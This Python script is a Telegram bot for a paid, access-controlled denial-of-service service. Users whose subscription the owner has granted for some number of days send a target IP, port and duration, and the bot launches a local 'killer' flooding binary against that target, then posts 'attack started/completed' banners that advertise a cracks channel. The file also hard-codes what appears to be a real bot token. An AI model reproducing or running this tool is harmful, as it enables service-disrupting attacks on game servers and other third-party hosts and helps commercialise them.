import telebot
import subprocess
import shlex
import json
import time
import os

BOT_TOKEN = "8133767092:AAGXXhLvad9X9PvJb1vMUhxvXWGOUMvGNoY"
OWNER_ID = 6353114118  # your Telegram ID
BINARY_PATH = "./killer"
ACCESS_FILE = "authorized_users.json"

bot = telebot.TeleBot(BOT_TOKEN)

# Load authorized users
def load_access():
    if not os.path.exists(ACCESS_FILE):
        return {}
    with open(ACCESS_FILE, "r") as f:
        return json.load(f)

# Save authorized users
def save_access(data):
    with open(ACCESS_FILE, "w") as f:
        json.dump(data, f)

# Check if user has access
def has_access(user_id):
    users = load_access()
    expire = users.get(str(user_id), 0)
    return time.time() < expire

# /add command – Owner only
@bot.message_handler(commands=["add"])
def add_user(message):
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "🚫 Unauthorized.")
        return

    parts = message.text.split()
    if len(parts) != 3:
        bot.reply_to(message, "Usage: /add <user_id> <days>")
        return

    try:
        user_id = int(parts[1])
        days = int(parts[2])
        expire_time = int(time.time()) + (days * 86400)

        users = load_access()
        users[str(user_id)] = expire_time
        save_access(users)

        bot.reply_to(message, f"✅ User {user_id} added for {days} day(s).")
    except:
        bot.reply_to(message, "❌ Invalid input.")

@bot.message_handler(commands=["bgmi"])
def handle_bgmi(message):
    user_id = message.from_user.id
    if not has_access(user_id):
        bot.reply_to(message, "🚫 You don't have access. Contact the owner.")
        return

    args = message.text.split()
    if len(args) < 4:
        bot.reply_to(message, "Usage: /bgmi <ip> <port> <duration>")
        return

    ip = args[1]
    port = args[2]
    duration = args[3]

    threads = "15"
    pps = "2000"

    # Compose started message with placeholders
    started_msg = f"""
╔════════════════════════════════╗
║ 🚀 **𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗧𝗔𝗥𝗧𝗘𝗗!** 🚀 ║
╚════════════════════════════════╝

🔥 **𝗔𝗧𝗧𝗔𝗖𝗞𝗘𝗥:** 🎭 `⏤͟͞𝙋𝙍𝙄𝙈𝙀𝙭𝙄𝙎𝘼𝙂𝙄 [𝙋𝘼𝙄𝘿 𝙋𝙍𝙊𝙈𝙊𝙏𝙀𝙍]`
🏆 **𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘:** `@SLAYER_OP7`

🎯 **𝗧𝗔𝗥𝗚𝗘𝗧 𝗗𝗘𝗧𝗔𝗜𝗟𝗦:**
╔═════════════════════════════╗
║ 🎯 **𝗧𝗔𝗥𝗚𝗘𝗧 𝗜𝗣:** `{ip}:{port}`
║ ⏳ **𝗗𝗨𝗥𝗔𝗧𝗜𝗢𝗡:** `{duration} sec`
║ 🔥 **𝗜𝗡𝗣𝗨𝗧 𝗗𝗨𝗥𝗔𝗧𝗜𝗢𝗡:** `{duration} sec`
╚═════════════════════════════╝

🎖 **𝗥𝗘𝗠𝗔𝗜𝗡𝗜𝗡𝗚 𝗔𝗧𝗧𝗔𝗖𝗞𝗦:** `29 / 5`
⚠️ **𝗦𝗘𝗡𝗗 𝗙𝗘𝗘𝗗𝗕𝗔𝗖𝗞 𝗔𝗙𝗧𝗘𝗥 𝗚𝗔𝗠𝗘!** ⚠️
"""

    try:
        cmd = f"{BINARY_PATH} {ip} {port} {duration} {threads} {pps}"
        subprocess.Popen(shlex.split(cmd))

        # Send started message (Markdown formatting)
        bot.send_message(message.chat.id, started_msg, parse_mode="Markdown")

        # Function to send the completed message after the attack duration
        def attack_complete():
            time.sleep(int(duration))
            executed_by = message.from_user.username or message.from_user.first_name or "UnknownUser"

            completed_msg = f"""
╔════════════════════════════════╗
║ 🚀 𝗔𝗧𝗧𝗔𝗖𝗞 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟𝗬! 🚀 ║
╚════════════════════════════════╝
🎯 𝗧𝗔𝗥𝗚𝗘𝗧 𝗜𝗡𝗙𝗢:
╔════════════════════════════════════╗
║ 🎯 𝗜𝗣              ➤  `{ip}`
║ 🚪 𝗣𝗢𝗥𝗧           ➤  `{port}`
║ ⏱️ 𝗗𝗨𝗥𝗔𝗧𝗜𝗢𝗡      ➤  `{duration} sec`
║ ⏳ 𝗗𝗘𝗙𝗔𝗨𝗟𝗧 𝗧𝗜𝗠𝗘  ➤  `180 sec`
╚════════════════════════════════════╝
💀 𝗘𝗫𝗘𝗖𝗨𝗧𝗘𝗗 𝗕𝗬: 🥷 @{executed_by} 💀
⚡ 𝗠𝗜𝗦𝗦𝗜𝗢𝗡 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 — 𝐈𝐒𝐀𝐆𝐈 ⚡

🔗 𝙎𝙪𝙥𝙥𝙤𝙧𝙩 𝙂𝙧𝙤𝙪𝙥: [ISAGIxCRACKS](https://t.me/ISAGIxCRACKS)
"""
            bot.send_message(message.chat.id, completed_msg, parse_mode="Markdown")

        threading.Thread(target=attack_complete).start()

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")



# /myaccess command (optional)
@bot.message_handler(commands=["myaccess"])
def my_access(message):
    users = load_access()
    expire = users.get(str(message.from_user.id), 0)
    if time.time() < expire:
        remaining = int((expire - time.time()) / 86400)
        bot.reply_to(message, f"✅ Access active. Expires in {remaining} day(s).")
    else:
        bot.reply_to(message, "❌ You have no access.")

bot.polling()
